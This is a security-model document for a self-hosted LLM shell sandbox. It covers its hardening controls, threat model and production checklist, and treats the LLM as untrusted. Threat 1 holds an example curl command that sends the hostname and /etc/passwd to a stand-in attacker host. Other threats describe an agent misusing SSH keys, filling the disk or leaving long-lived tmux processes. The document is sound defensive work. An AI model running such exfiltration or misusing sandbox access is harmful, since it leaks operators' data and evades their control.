# Security Model

This document describes what the sandbox is and isn't, the threat surface,
and the controls that ship in the box. Read this before exposing the
service on a public network.

## Status — v2.1 (post-audit)

The v1.x release was a pet project. v2.x is production-shaped; the
following production-readiness items landed between v1 and v2:

| Control | v1 | v2 | Notes |
|---------|----|----|-------|
| `import re` in agent_api.py | ❌ missing | ✅ present | v1 would crash on every successful command |
| Path-traversal protection in `cwd` | ❌ none | ✅ `os.path.realpath` + workspace whitelist | blocks `..` and symlinks |
| Bearer-token auth on proxy | ❌ none | ✅ `OPENAPI_PROXY_TOKEN` (constant-time compare) | required, proxy 503s if unset |
| CORS allowlist | ❌ `["*"]` | ✅ opt-in via `OPENAPI_PROXY_CORS_ORIGINS` | off by default |
| Container runs as non-root | ❌ `user: root` | ✅ `user: 1000:1000` | |
| `read_only` root filesystem | ❌ `false` | ✅ `true` + tmpfs for `/tmp`, `/run` | |
| Dropped capabilities | ❌ default | ✅ `cap_drop: [ALL]` | no caps re-added |
| `no-new-privileges` | ❌ off | ✅ on | blocks setuid binaries |
| Resource limits | ❌ none | ✅ `mem_limit`, `cpus`, `pids_limit` | kills fork-bombs at 256 PIDs |
| SSH host allowlist | ❌ `accept-new` for any host | ✅ `OPENAPI_PROXY_SSH_ALLOWLIST` (CIDR/hostname) | empty = disabled |
| Per-WebSocket session | ❌ shared global | ✅ unique `ws-<hex>` per connection | closes cross-user leak |
| Singleton httpx client | ❌ per-request TCP handshake | ✅ `lifespan` + connection pool | fixes ephemeral-port exhaustion |
| /capture endpoint (no shell wrapper) | ❌ | ✅ | WebSocket poll no longer spawns bash per tick |
| Persistent session registry | ❌ in-memory only | ✅ JSON file on `/workspace` | survives container restart |
| Structured logging | ❌ | ✅ JSON-formatted `logger.info` with sid/cmd_len/exit/duration | audit-ready |
| Rate limiting | ❌ | ✅ token-bucket per token (`OPENAPI_PROXY_RATE_LIMIT_RPM`) | |
| Coverage threshold in CI | ❌ | ✅ `--cov-fail-under=70` | fails build if drops |
| Bandit SAST in CI | ❌ | ✅ | |
| Gitleaks secret scan in CI | ❌ | ✅ | |
| Trivy container scan in CI | ❌ | ✅ | |
| Multi-stage Dockerfiles | ❌ | ✅ | |
| Secrets in `.env` (not in compose) | ❌ in compose | ✅ `.env.example` template | |
| Uvicorn graceful shutdown | ❌ SIGKILL | ✅ `timeout-graceful-shutdown=25` | |

## What you get out of the box (v2.1)

| Control                              | Status                                          |
|--------------------------------------|-------------------------------------------------|
| `read_only: true`                    | Enabled — writes go through bind-mounts + tmpfs |
| `user: 1000:1000`                    | Non-root inside the container                   |
| `cap_drop: [ALL]`                    | All capabilities dropped                         |
| `no-new-privileges: true`            | Enabled                                         |
| `mem_limit`, `cpus`, `pids_limit`    | Set in compose                                  |
| Bearer-token auth on proxy           | Required (`OPENAPI_PROXY_TOKEN`)                |
| CORS allowlist                       | Opt-in (off by default)                          |
| Rate limit (default 120 rpm)         | Configurable                                    |
| SSH host allowlist                   | Configurable (CIDR/hostname, empty=disabled)    |
| Persistent session registry          | JSON file on `/workspace`                       |
| Structured JSON logging              | stdout, audit-friendly                          |
| Network isolation between containers| All three share `agent-net` bridge              |
| External network access              | **Unrestricted** (intentional)                  |
| Authentication on Open WebUI         | `WEBUI_AUTH=true` (default)                     |
| Secret rotation                      | Manual — `.env` file (not in git)               |

## Threat model

**Trusted:**

* The host running Docker.
* The user who can run `docker compose` / edit the compose file.
* Your SearXNG and whisper-api backends (out of scope).

**Untrusted:**

* The LLM and any prompt it has been fed, including user input.
* Anyone who can talk to Open WebUI's HTTP port (3001) without
  authenticating if you've misconfigured `WEBUI_AUTH`.
* Anyone who can reach `openapi-proxy:8090` **with** a valid bearer token
  (e.g. a compromised Open WebUI instance). The token is shared between
  the UI and the proxy — there is no per-user enforcement at the proxy
  layer.

## Threats and mitigations

### 1. LLM exfiltrates data over the network

The LLM has full outbound network access. It can `curl https://attacker.example/$(hostname; cat /etc/passwd)`
and you have no visibility.

**Mitigations:**

* Run the stack on a host with egress filtering (firewall, proxy).
* Run inside a network namespace with no external route.
* Set `mem_limit` and `pids_limit` so a runaway process is contained.

### 2. LLM reads host files outside the workspace

The `cwd` parameter in `POST /sessions` is symlink-resolved and must
lie inside the workspace root. Anything outside returns 400. The only
files visible to the sandbox are:

* `/workspace` (bind-mount — controlled by you)
* `/home/agent` (named volume)
* `/opt/search` (read-only bind-mount)
* `/home/agent/.ssh` (read-only bind-mount)
* `/var/cache/apt`, `/home/agent/.cache/pip` (named volumes)

The `read_only: true` root filesystem + dropped caps prevent writes
to anywhere else. Even if the LLM is "root" inside the container
(it isn't — it runs as UID 1000), it cannot modify bind-mounted host
files or write outside tmpfs.

### 3. LLM uses the SSH key to access your fleet

`/home/agent/.ssh` is mounted read-only. The LLM cannot modify keys on
the host. It **can** use them to authenticate to other hosts.

The v2.1 release adds a per-host allowlist via `OPENAPI_PROXY_SSH_ALLOWLIST`
which restricts the `ssh <host>` shortcut. Direct `ssh` invocations from
inside the sandbox still bypass this — that's by design (the LLM is
inside a real shell). Mitigations:

* Use dedicated, scoped keys in `/opt/agent-workspace/.ssh/`.
* If you don't need outbound SSH, remove the mount entirely.
* Treat the agent's SSH identity as semi-trusted.

### 4. LLM fills the disk

`mem_limit: 2g`, `pids_limit: 256`, and a `read_only` root filesystem
mitigate most disk-fill attacks. The only writable surface is the
`/workspace` bind-mount, which is on your host filesystem. If you
want to bound it, put `/opt/agent-workspace` on its own filesystem
with a quota.

### 5. LLM spawns long-running processes

`tmux` keeps them alive forever. They consume memory and PIDs.

**Mitigations:**

* `pids_limit: 256` caps total processes in the container.
* `mem_limit: 2g` caps total memory.
* Add a periodic janitor that kills tmux sessions older than N hours
  (not yet implemented — see [docs/CONFIGURATION.md](CONFIGURATION.md)
  for how to add it as a cron job).

### 6. Token leak via `TOOL_SERVER_CONNECTIONS`

The `TOOL_SERVER_CONNECTIONS` env var in `docker-compose.yml` embeds
the `OPENAPI_PROXY_TOKEN` so Open WebUI can authenticate. Anyone with
`docker inspect` on the Open WebUI container can extract it.

**Mitigations:**

* Treat the Open WebUI container as sensitive (root-only access).
* Rotate the token by editing `.env` and running
  `docker compose up -d --force-recreate open-webui openapi-proxy`.
* For multi-tenant deployments, swap Open WebUI's shared token for
  per-user JWTs (out of scope for this repo).

### 7. Cross-user data leak via WebSocket

In v1 the WebSocket endpoint used a fixed `session_id = "openwebui-ws"`,
so two users opening the terminal would see each other's output. v2.1
generates a unique `ws-<hex>` per connection and tears down the
tmux session when the connection closes.

## What's intentionally not implemented

* **User-level isolation at the sandbox layer.** All chats share the
  same `sandbox-agent` container, which means all users share the
  same tmux server. Open WebUI generates unique `session_id`s per
  chat, but a determined user could guess another user's `session_id`
  and `tmux attach` to it. Per-user containers is the only complete
  mitigation; that's out of scope here.
* **Per-user auth on the proxy.** A single bearer token is shared
  across all users. Multi-tenant auth would need a JWT layer with
  user identity and per-user rate limits.
* **Seccomp/AppArmor.** Not configured. Add a profile in production.

## Trust model (explicit — single operator)

This stack is designed for the **single-operator** deployment shape:

```
   ┌─────────────────────────────────────────────────────┐
   │  One admin who owns:                                │
   │   • the Open WebUI instance                         │
   │   • the bearer token in TOOL_SERVER_CONNECTIONS     │
   │   • the AGENT_TOKEN env var on the sandbox-agent    │
   │   • the /opt/agent-workspace directory               │
   │   • all SSH keys mounted into the sandbox            │
   └─────────────────────────────────────────────────────┘
                          │
                          ▼
   The bearer token, the workspace, the SSH keys and the agent
   are all in the same trust boundary. Anyone with the token can
   do anything the admin can do.
```

If you need **multi-tenant**, the right shape is:

* one Open WebUI instance per user (or a proper auth proxy in front)
* one `sandbox-agent` per user, with its own `AGENT_TOKEN` and
  `/workspace`
* one bearer token per user
* per-user rate limits keyed on the user identity, not the token

We do not implement that here. Bolting multi-tenant auth onto this
single-token design would be a security anti-pattern — better to fork
or re-architect.

## Hardening checklist (for production)

- [ ] Copy `.env.example` to `.env`, fill in real secrets from
      `openssl rand -hex 32` and `openssl rand -base64 48`
- [ ] Set `ENABLE_SIGNUP=false` and create users manually
- [ ] Set `OPENAPI_PROXY_CORS_ORIGINS` if you serve a browser UI
- [ ] Set `OPENAPI_PROXY_SSH_ALLOWLIST` to your actual fleet
- [ ] Add a periodic janitor for old tmux sessions
- [ ] Put `/opt/agent-workspace` on a separate filesystem with a quota
- [ ] Enable Docker user namespaces (`/etc/subuid` + `userns-remap`)
- [ ] Run behind a reverse proxy (Caddy/Traefik) with TLS
- [ ] Pipe JSON logs to your log aggregator
- [ ] Set up a Prometheus scrape for `uvicorn` access logs (out of
      scope for this repo — add an exporter)
